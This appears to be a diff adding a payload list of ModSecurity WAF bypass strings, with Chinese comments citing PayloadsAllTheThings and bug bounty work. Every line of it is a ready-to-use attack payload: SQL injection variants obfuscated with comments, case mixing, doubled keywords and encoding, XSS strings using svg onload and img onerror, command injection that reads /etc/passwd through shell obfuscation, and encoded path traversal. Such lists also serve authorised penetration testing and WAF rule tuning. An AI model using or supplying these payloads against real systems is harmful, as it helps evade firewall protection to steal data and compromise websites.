@@ -1,0 +1,69 @@
+# ModSecurity WAF Bypass Payloads
+# 来源: PayloadsAllTheThings, Bug Bounty经验
+# ModSecurity WAF绕过技术
+
+# === SQL注入绕过 ===
+# 注释绕过
+'/**/OR/**/1/**/=/**/1--
+'/**/UNION/**/SELECT/**/1,2,3--
+uni/**/on sel/**/ect 1,2,3--
+un/**/ion se/**/lect 1,2,3--
+
+# 条件注释 (MySQL)
+/*!50000UNION*//*!50000SELECT*/1,2,3--
+' /*!OR*/ '1'='1'--
+'/*!50000AND*/1=1--
+
+# 空格替代
+'%09OR%091=1--
+'%0aOR%0a1=1--
+'%0bOR%0b1=1--
+'%0cOR%0c1=1--
+'%0dOR%0d1=1--
+'+OR+1=1--
+
+# 大小写混合
+' UnIoN SeLeCt 1,2,3--
+' uNiOn AlL sElEcT 1,2,3--
+' oR 1=1--
+' Or 1=1--
+
+# 双写绕过
+' SELSELECTECT 1,2,3--
+' UNUNIONION SELSELECTECT 1,2,3--
+' OORR 1=1--
+' ANANDD 1=1--
+
+# 编码绕过
+%27%20OR%20%271%27%3D%271
+%27%20UNION%20SELECT%201,2,3--
+%252527%2520OR%25201=1--
+
+# 十六进制
+' OR 0x31=0x31--
+' UNION SELECT 0x61646d696e--
+
+# HPP (HTTP Parameter Pollution)
+id=1&id=' OR '1'='1
+id=1/*&id=*/' OR '1'='1
+
+# === XSS绕过 ===
+<svg/onload=alert(1)>
+<img src=x onerror=alert`1`>
+<img/src=x/onerror=alert(1)>
+<img	src=x	onerror=alert(1)>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>\u0061lert(1)</script>
+<svg onload=alert&lpar;1&rpar;>
+
+# === 命令注入绕过 ===
+;cat${IFS}/etc/passwd
+;{cat,/etc/passwd}
+;c\at /e\tc/pa\sswd
+;who$@ami
+;$'\x63\x61\x74' /etc/passwd
+
+# === 路径遍历绕过 ===
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc/passwd
+..%252f..%252f..%252fetc/passwd
